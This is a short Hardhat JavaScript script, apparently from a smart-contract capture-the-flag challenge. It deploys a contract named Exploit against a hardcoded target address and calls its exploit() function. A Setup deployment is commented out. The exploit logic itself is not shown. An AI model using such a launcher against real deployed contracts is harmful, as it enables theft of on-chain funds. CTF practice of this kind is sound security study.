const { ethers } = require("hardhat");

async function main() {
    //const Setup = await ethers.getContractFactory("Setup");
    //const setup = await Setup.deploy();

    var address = '0x2bbCa2CBD415F2C3F054f51F0FffCd112fB5F22D';
    const Exploit = await ethers.getContractFactory("Exploit");
    console.log("deploying exploit...");
    const exploit = await Exploit.deploy(address);
    console.log("deployed address:", exploit.address);
    await exploit.exploit();
};
main().then(() => process.exit(0)).catch(error => {
  console.error(error);
  process.exit(1);
});
